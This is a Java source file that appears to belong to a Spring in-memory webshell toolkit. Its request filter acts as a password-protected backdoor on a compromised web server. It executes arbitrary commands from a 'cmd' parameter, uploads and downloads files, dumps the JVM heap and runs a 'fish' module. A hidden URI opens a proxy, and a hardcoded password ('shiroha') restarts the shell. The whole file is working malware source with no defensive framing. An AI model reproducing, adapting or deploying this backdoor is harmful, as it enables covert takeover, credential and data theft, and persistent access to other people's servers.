package com.stdout.Utils;

import com.stdout.Config.ShellConfig;
import com.stdout.Models.FileManager;
import com.stdout.Models.HeapDumper;
import com.stdout.Models.SpringProxy;
import com.stdout.Utils.Redefine.MyRequest;
import com.stdout.Utils.Redefine.MyResponse;
import com.stdout.springMem.SpringMemShell;

import java.lang.instrument.UnmodifiableClassException;

public class PreDoFilter {
    public static String PreDeal0(Object request, Object response) throws Exception {
        String result = "";
        String uri = MyRequest.getRequestURI(request);
        String ans = PreDelURI(uri);
        if (ans != null && ans.equals("Proxy")) {
            SpringProxy.doProxy(request, response);
            return null;
        }

        result += com.stdout.Models.Fish.StaticFish(uri);

        if (result.length() != 0) {
            return result;
        }

        String password = MyRequest.getParameter(request, "password");

        if (password != null) {
            if (password.equals(ShellConfig.SpringMemShellConfig.MemShellPassword)) {
                String model = MyRequest.getParameter(request, "model");

                switch (model) {
                    case "help":
                        result += com.stdout.Models.Helper.help();
                        break;
                    case "exec":
                        String cmd = MyRequest.getParameter(request, "cmd");
                        result += com.stdout.Models.CommandExecutor.exec(cmd);
                        break;
                    case "fish": {
                        String action = MyRequest.getParameter(request, "action");
                        switch (action) {
                            case "start":
                                String target = MyRequest.getParameter(request, "target");
                                String file = MyRequest.getParameter(request, "file");
                                result += com.stdout.Models.Fish.fishStart(target, file);
                                break;
                            case "stop":
                                result += com.stdout.Models.Fish.fishStop();
                                break;
                            case "show":
                                result += com.stdout.Models.Fish.fishShow();
                                break;
                        }
                        break;
                    }
                    case "file": {
                        String action = MyRequest.getParameter(request, "action");
                        if (action == null) {
                            result += FileManager.uploadView();
                        } else if (action.equals("download")) {
                            try {
                                String path = MyRequest.getParameter(request, "path");
                                FileManager.download(response, path);
                                return null;
                            } catch (Exception e) {
                                result += "need param: path";
                            }
                        } else if (action.equals("upload")) {
                            result += FileManager.upload(request);
                        }
                        break;
                    }
                    case "heapdump":
                        String path = new HeapDumper().dumpHeap();
                        FileManager.download(response, path);
                        return null;
                    case "exit":
                        result += com.stdout.springMem.SpringMemModels.exit();
                        break;
                }

                return result;
            }
        }
        return "";
    }
    public static boolean PreDeal(Object request, Object response) throws Exception {
        String result = PreDeal0(request, response);
        if (result == null) {
            try {
                request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        }
        if (!result.equals("")) {
            MyResponse.getWriter(response).write(result);
            // response.getWriter().write(result);
            try {
                request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        }
        return false;
    }

    public static String PreDelURI(String uri) {
        if (uri.equals("/eGluZ3hpbmcK")) {
            return "Proxy";
        }
        return null;
    }

    public static boolean Restart(Object request, Object response) {
        try {
            String password = MyRequest.getParameter(request, "password");
            if (password.equals("shiroha")) {
                String version = MyRequest.getParameter(request, "version");
                if (version.equals("2")) {
                    String result = SpringMemShell.start();
                    MyResponse.getWriter(response).write(result);
                    request.getClass().getDeclaredMethod("setHandled", new Class[]{boolean.class}).invoke(request, new Object[]{true});
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }
}
